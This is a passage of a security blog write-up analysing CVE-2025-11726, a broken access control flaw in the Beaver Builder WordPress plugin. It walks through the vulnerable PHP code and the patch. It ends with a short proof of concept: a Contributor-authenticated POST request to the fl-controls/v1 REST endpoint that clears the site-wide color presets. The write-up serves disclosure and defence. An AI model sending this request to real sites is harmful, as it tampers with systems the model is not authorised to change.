&lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;Beaver Builder – WordPress Page Builder&lt;/strong&gt; plugin for WordPress contains a &lt;strong&gt;Missing Authorization&lt;/strong&gt; vulnerability in all versions up to and including &lt;strong&gt;2.9.4&lt;/strong&gt;. The root cause is insufficient &lt;strong&gt;capability checks&lt;/strong&gt; in the &lt;strong&gt;REST API endpoints&lt;/strong&gt; under the namespace &lt;strong&gt;&lt;code&gt;fl-controls/v1&lt;/code&gt;&lt;/strong&gt;, which manage &lt;strong&gt;Global Presets&lt;/strong&gt; across the entire website. This allows &lt;strong&gt;authenticated attackers&lt;/strong&gt; with at least &lt;strong&gt;Contributor&lt;/strong&gt; privileges to &lt;strong&gt;add, modify, or delete&lt;/strong&gt; &lt;strong&gt;global color presets&lt;/strong&gt; and &lt;strong&gt;background presets&lt;/strong&gt;, affecting all content built with &lt;strong&gt;Beaver Builder&lt;/strong&gt; site-wide.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-11726&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-11726&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Broken Access Control&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.9.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.9.4.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.4)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/beaver-builder-lite-version/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Beaver Builder Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Beaver Builder&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;2.9.4&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;2.9.4.1&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;In the vulnerable version (v2.9.4):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;static public function register_rest_endpoints() {&#xA;    ...&#xA;    register_rest_route( &amp;#39;fl-controls/v1&amp;#39;, &amp;#39;/color_presets/&amp;#39;, array(&#xA;        &amp;#39;methods&amp;#39;             =&amp;gt; WP_REST_Server::CREATABLE,&#xA;        &amp;#39;callback&amp;#39;            =&amp;gt; __CLASS__ . &amp;#39;::set_color_presets&amp;#39;,&#xA;        &amp;#39;permission_callback&amp;#39; =&amp;gt; __CLASS__ . &amp;#39;::check_permission&amp;#39;,&#xA;    ) );&#xA;&#xA;    register_rest_route( &amp;#39;fl-controls/v1&amp;#39;, &amp;#39;/color_presets/&amp;#39;, array(&#xA;        &amp;#39;methods&amp;#39;             =&amp;gt; WP_REST_Server::DELETABLE,&#xA;        &amp;#39;callback&amp;#39;            =&amp;gt; __CLASS__ . &amp;#39;::delete_color_presets&amp;#39;,&#xA;        &amp;#39;permission_callback&amp;#39; =&amp;gt; __CLASS__ . &amp;#39;::check_permission&amp;#39;,&#xA;    ) );&#xA;&#xA;    register_rest_route( &amp;#39;fl-controls/v1&amp;#39;, &amp;#39;/background_presets/&amp;#39;, array(&#xA;        &amp;#39;methods&amp;#39;             =&amp;gt; WP_REST_Server::CREATABLE,&#xA;        &amp;#39;callback&amp;#39;            =&amp;gt; __CLASS__ . &amp;#39;::set_background_presets&amp;#39;,&#xA;        &amp;#39;permission_callback&amp;#39; =&amp;gt; __CLASS__ . &amp;#39;::check_permission&amp;#39;,&#xA;    ) );&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The plugin registers &lt;strong&gt;REST API endpoints&lt;/strong&gt; under the namespace &lt;strong&gt;&lt;code&gt;fl-controls/v1&lt;/code&gt;&lt;/strong&gt;, which can &lt;strong&gt;add, modify, or delete&lt;/strong&gt; &lt;strong&gt;global color presets&lt;/strong&gt; and &lt;strong&gt;background presets&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;These APIs control access via the callback &lt;code&gt;check_permission&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;static public function check_permission() {&#xA;    return FLBuilderUserAccess::current_user_can( &amp;#39;builder_access&amp;#39; );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The plugin customizes a &lt;code&gt;current_user_can&lt;/code&gt; function and checks the &lt;code&gt;builder_access&lt;/code&gt; permission:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function register_default_settings() {&#xA;    self::register_setting( &amp;#39;builder_access&amp;#39;, array(&#xA;        &amp;#39;default&amp;#39;     =&amp;gt; &amp;#39;all&amp;#39;,&#xA;        &amp;#39;group&amp;#39;       =&amp;gt; __( &amp;#39;Frontend&amp;#39;, &amp;#39;fl-builder&amp;#39; ),&#xA;        &amp;#39;label&amp;#39;       =&amp;gt; __( &amp;#39;Builder Access&amp;#39;, &amp;#39;fl-builder&amp;#39; ),&#xA;        &amp;#39;description&amp;#39; =&amp;gt; __( &amp;#39;The selected roles will have access to the builder for editing posts, pages, and CPTs.&amp;#39;, &amp;#39;fl-builder&amp;#39; ),&#xA;        &amp;#39;order&amp;#39;       =&amp;gt; &amp;#39;1&amp;#39;,&#xA;    ) );&#xA;&#xA;    self::register_setting( &amp;#39;unrestricted_editing&amp;#39;, array(&#xA;        &amp;#39;default&amp;#39;     =&amp;gt; &amp;#39;all&amp;#39;,&#xA;        &amp;#39;group&amp;#39;       =&amp;gt; __( &amp;#39;Frontend&amp;#39;, &amp;#39;fl-builder&amp;#39; ),&#xA;        &amp;#39;label&amp;#39;       =&amp;gt; __( &amp;#39;Unrestricted Editing&amp;#39;, &amp;#39;fl-builder&amp;#39; ),&#xA;        &amp;#39;description&amp;#39; =&amp;gt; __( &amp;#39;The selected roles will have unrestricted access to all editing features within the builder.&amp;#39;, &amp;#39;fl-builder&amp;#39; ),&#xA;        &amp;#39;order&amp;#39;       =&amp;gt; &amp;#39;2&amp;#39;,&#xA;    ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;builder_access&lt;/code&gt; is registered with &lt;code&gt;&#39;default&#39; =&amp;gt; &#39;all&#39;&lt;/code&gt;, meaning it applies to all users.&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition question open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-regular fa-circle-question&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Question&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;If &lt;code&gt;builder_access&lt;/code&gt; applies to all users, why is the vulnerability reported for Contributor privileges?&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;The answer lies in the logic of the plugin&amp;rsquo;s &lt;code&gt;current_user_can&lt;/code&gt; function:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;static public function current_user_can( $key ) {&#xA;    $user     = wp_get_current_user();&#xA;    $settings = self::get_saved_settings();&#xA;&#xA;    // Return false if no settings saved.&#xA;    if ( ! isset( $settings[ $key ] ) ) {&#xA;        return false;&#xA;    }&#xA;&#xA;    // Make sure super admins have administrator access.&#xA;    if ( is_multisite() &amp;amp;&amp;amp; is_super_admin() &amp;amp;&amp;amp; ! in_array( &amp;#39;administrator&amp;#39;, $user-&amp;gt;roles ) ) {&#xA;        $user-&amp;gt;roles[] = &amp;#39;administrator&amp;#39;;&#xA;    }&#xA;&#xA;    // Check the user&amp;#39;s roles against the saved settings.&#xA;    foreach ( $user-&amp;gt;roles as $role ) {&#xA;&#xA;        // Return true if the user has access.&#xA;        if ( isset( $settings[ $key ][ $role ] ) &amp;amp;&amp;amp; $settings[ $key ][ $role ] ) {&#xA;            return true;&#xA;        }&#xA;    }&#xA;&#xA;    return false;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;current_user_can&lt;/code&gt; checks permissions based on &lt;strong&gt;role + plugin settings&lt;/strong&gt;, not WordPress&amp;rsquo;s standard capabilities. It calls &lt;code&gt;self::get_saved_settings()&lt;/code&gt; to fetch settings:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;static public function get_saved_settings() {&#xA;    if ( self::$settings ) {&#xA;        return self::$settings;&#xA;    }&#xA;&#xA;    $roles       = self::get_all_roles();&#xA;    $settings    = FLBuilderModel::get_admin_settings_option( &amp;#39;_fl_builder_user_access&amp;#39;, true );&#xA;    $ms_settings = FLBuilderModel::get_admin_settings_option( &amp;#39;_fl_builder_user_access&amp;#39;, false );&#xA;    $ms_support  = FLBuilderAdminSettings::multisite_support();&#xA;&#xA;    if ( ! is_array( $settings ) ) {&#xA;        $settings = array();&#xA;    }&#xA;&#xA;    foreach ( self::$registered_settings as $key =&amp;gt; $data ) {&#xA;&#xA;        if ( ! isset( $settings[ $key ] ) ) {&#xA;            if ( $ms_support &amp;amp;&amp;amp; isset( $ms_settings[ $key ] ) ) {&#xA;                $settings[ $key ] = $ms_settings[ $key ];&#xA;            } else {&#xA;                $settings[ $key ] = array();&#xA;            }&#xA;        }&#xA;&#xA;        foreach ( $roles as $role_key =&amp;gt; $role_data ) {&#xA;&#xA;            if ( ! isset( $settings[ $key ][ $role_key ] ) ) {&#xA;&#xA;                if ( ! isset( $data[&amp;#39;default&amp;#39;] ) || ! $data[&amp;#39;default&amp;#39;] ) {&#xA;                    $settings[ $key ][ $role_key ] = false;&#xA;                } elseif ( is_array( $data[&amp;#39;default&amp;#39;] ) ) {&#xA;&#xA;                    if ( in_array( $role_key, $data[&amp;#39;default&amp;#39;] ) ) {&#xA;                        $settings[ $key ][ $role_key ] = true;&#xA;                    } else {&#xA;                        $settings[ $key ][ $role_key ] = false;&#xA;                    }&#xA;                } else {&#xA;                    $settings[ $key ][ $role_key ] = true;&#xA;                }&#xA;            }&#xA;        }&#xA;    }&#xA;&#xA;    self::$settings = $settings;&#xA;&#xA;    return $settings;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;get_saved_settings&lt;/code&gt; normalizes the role-based permission settings from the &lt;code&gt;_fl_builder_user_access&lt;/code&gt; option, applying defaults for each &lt;code&gt;$key&lt;/code&gt; and &lt;code&gt;role&lt;/code&gt;, and caches them in &lt;code&gt;self::$settings&lt;/code&gt;. Roles are retrieved via &lt;code&gt;self::get_all_roles()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;static public function get_all_roles() {&#xA;    if ( ! function_exists( &amp;#39;get_editable_roles&amp;#39; ) ) {&#xA;        require_once ABSPATH . &amp;#39;wp-admin/includes/user.php&amp;#39;;&#xA;    }&#xA;&#xA;    $editable_roles = get_editable_roles();&#xA;    $roles          = array();&#xA;    $caps           = apply_filters( &amp;#39;fl_builder_user_access_capabilities&amp;#39;, array( &amp;#39;edit_posts&amp;#39; ) );&#xA;&#xA;    foreach ( $editable_roles as $role =&amp;gt; $data ) {&#xA;        foreach ( $caps as $cap ) {&#xA;            if ( isset( $data[&amp;#39;capabilities&amp;#39;][ $cap ] ) &amp;amp;&amp;amp; 1 == $data[&amp;#39;capabilities&amp;#39;][ $cap ] ) {&#xA;                $roles[ $role ] = $data[&amp;#39;name&amp;#39;];&#xA;            }&#xA;        }&#xA;    }&#xA;&#xA;    return $roles;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;get_all_roles()&lt;/code&gt; returns a list of &lt;strong&gt;roles with a specific capability&lt;/strong&gt;, defaulting to &lt;code&gt;edit_posts&lt;/code&gt; — effectively including all roles &lt;strong&gt;from Contributor and above&lt;/strong&gt;. &lt;mark class=&#34;mark-default&#34;&gt;This is the explanation&lt;/mark&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Patch (v2.9.4.1):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;check_permission&lt;/code&gt; is replaced with &lt;code&gt;check_write_permission&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-07-cve-2025-11726/diff1.png&#34; title=&#34;Using check_write_permission instead of check_permission&#34; data-thumbnail=&#34;/posts/2025-12-07-cve-2025-11726/diff1.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff1&lt;/h2&gt;&lt;p&gt;Using check_write_permission instead of check_permission&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-07-cve-2025-11726/diff1.png&#39; alt=&#34;Diff1&#34; height=&#34;625&#34; width=&#34;1832&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Using check_write_permission instead of check_permission&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;It requires &lt;strong&gt;both&lt;/strong&gt; internal plugin permissions: &lt;code&gt;unrestricted_editing&lt;/code&gt; and &lt;code&gt;builder_access&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;static public function check_write_permission() {&#xA;    return ( FLBuilderUserAccess::current_user_can( &amp;#39;unrestricted_editing&amp;#39; ) &amp;amp;&amp;amp; FLBuilderUserAccess::current_user_can( &amp;#39;builder_access&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;These permissions are revised to apply only to &lt;code&gt;administrator&lt;/code&gt; and &lt;code&gt;editor&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-07-cve-2025-11726/diff2.png&#34; title=&#34;Permission changes&#34; data-thumbnail=&#34;/posts/2025-12-07-cve-2025-11726/diff2.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff2&lt;/h2&gt;&lt;p&gt;Permission changes&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-07-cve-2025-11726/diff2.png&#39; alt=&#34;Diff2&#34; height=&#34;341&#34; width=&#34;1748&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Permission changes&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;&lt;strong&gt;Corresponding endpoint callbacks:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;static public function set_color_presets( $request ) {&#xA;    $color_presets = (array) get_option( &amp;#39;_fl_builder_color_presets&amp;#39;, [] );&#xA;    $params        = $request-&amp;gt;get_params();&#xA;&#xA;    if ( isset( $params[&amp;#39;clearPresets&amp;#39;] ) &amp;amp;&amp;amp; true === $params[&amp;#39;clearPresets&amp;#39;] ) {&#xA;        if ( update_option( &amp;#39;_fl_builder_color_presets&amp;#39;, [] ) ) {&#xA;            return new WP_REST_Response( [&#xA;                &amp;#39;presets&amp;#39; =&amp;gt; [],&#xA;            ], 200 );&#xA;        }&#xA;    }&#xA;&#xA;    // Dedupe the merged arrays&#xA;    $new_presets = array_unique( array_merge( $color_presets, $params[&amp;#39;addPresets&amp;#39;] ) );&#xA;&#xA;    update_option( &amp;#39;_fl_builder_color_presets&amp;#39;, $new_presets );&#xA;&#xA;    return new WP_REST_Response( [&#xA;        &amp;#39;presets&amp;#39; =&amp;gt; $new_presets,&#xA;    ], 200 );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;static public function delete_color_presets( $request ) {&#xA;    $color_presets = (array) get_option( &amp;#39;_fl_builder_color_presets&amp;#39;, [] );&#xA;    $params        = $request-&amp;gt;get_params();&#xA;&#xA;    $new_presets = array_values( array_filter( $color_presets, function ( $color ) use ( $params ) {&#xA;&#xA;        // Check for exact match and value w/ # prepended&#xA;        return ! in_array( $color, $params[&amp;#39;deletePresets&amp;#39;] ) &amp;amp;&amp;amp; ! in_array( &amp;#39;#&amp;#39; . $color, $params[&amp;#39;deletePresets&amp;#39;] );&#xA;    } ) );&#xA;&#xA;    if ( update_option( &amp;#39;_fl_builder_color_presets&amp;#39;, $new_presets ) ) {&#xA;        $color_presets = $new_presets;&#xA;    }&#xA;&#xA;    return new WP_REST_Response( [&#xA;        &amp;#39;presets&amp;#39; =&amp;gt; $color_presets,&#xA;    ], 200 );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;static public function set_background_presets( $request ) {&#xA;    $presets     = (array) get_option( &amp;#39;_fl_builder_color_presets&amp;#39;, [] );&#xA;    $params      = $request-&amp;gt;get_params();&#xA;    $new_presets = array_merge( $presets, $params[&amp;#39;addPresets&amp;#39;] );&#xA;&#xA;    if ( update_option( &amp;#39;_fl_builder_background_presets&amp;#39;, $new_presets ) ) {&#xA;        $presets = $new_presets;&#xA;    }&#xA;&#xA;    return new WP_REST_Response( [&#xA;        &amp;#39;presets&amp;#39; =&amp;gt; $presets,&#xA;    ], 200 );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;Authenticated user (Contributor or higher)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Sends request to /wp-json/fl-controls/v1/*&amp;#34;]&#xA;--&amp;gt; C[&amp;#34;REST API calls permission_callback = check_permission()&amp;#34;]&#xA;--&amp;gt; D[&amp;#34;check_permission() → current_user_can(&amp;#39;builder_access&amp;#39;)&amp;#34;]&#xA;--&amp;gt; G[&amp;#34;builder_access = true for Contributor&amp;#34;]&#xA;--&amp;gt; H[&amp;#34;Request is accepted&amp;#34;]&#xA;--&amp;gt; I[&amp;#34;set_color_presets / delete_color_presets / set_background_presets&amp;#34;]&#xA;--&amp;gt; J[&amp;#34;Global Presets are added / modified / deleted site-wide&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Login with a Contributor account.&lt;/li&gt;&#xA;&lt;li&gt;Obtain nonce by pasting the following in the browser console:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;wpApiSettings.nonce&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Add the X-WP-Nonce header and send the request:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/fl-controls/v1/color_presets/ HTTP/1.1&#xA;Cookie: contributor_cookie&#xA;X-WP-Nonce: 0db9546893&#xA;&#xA;{&#xA;  &amp;#34;clearPresets&amp;#34;: true&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Repeat similarly for the other endpoints.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-11726 is a &lt;strong&gt;Broken Access Control&lt;/strong&gt; issue caused by the plugin only checking the internal &lt;code&gt;builder_access&lt;/code&gt; permission — which by default applies to roles with &lt;code&gt;edit_posts&lt;/code&gt; (i.e., &lt;strong&gt;Contributor and above&lt;/strong&gt;). Therefore, merely logging in allows an attacker to &lt;strong&gt;add, modify, or delete Global Presets&lt;/strong&gt; via the &lt;code&gt;fl-controls/v1&lt;/code&gt; REST API, affecting all Beaver Builder content site-wide.&lt;/p&gt;&#xA;&lt;p&gt;The patch in &lt;strong&gt;v2.9.4.1&lt;/strong&gt; fixes this by replacing &lt;code&gt;check_permission&lt;/code&gt; with &lt;code&gt;check_write_permission&lt;/code&gt;, requiring &lt;strong&gt;both&lt;/strong&gt; &lt;code&gt;builder_access&lt;/code&gt; and &lt;code&gt;unrestricted_editing&lt;/code&gt;, and limiting it to &lt;strong&gt;Editor and Administrator&lt;/strong&gt; roles.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 